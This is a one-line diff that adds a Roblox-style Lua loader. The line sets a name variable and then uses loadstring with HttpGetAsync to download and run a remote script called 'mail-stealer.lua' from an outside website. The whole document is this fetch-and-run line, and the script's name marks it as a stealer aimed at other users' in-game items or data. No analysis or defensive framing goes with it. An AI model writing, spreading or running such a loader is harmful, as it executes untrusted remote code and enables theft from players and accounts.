@@ -1,0 +1,1 @@
+getgenv().name = "haksjbdjhsb" loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
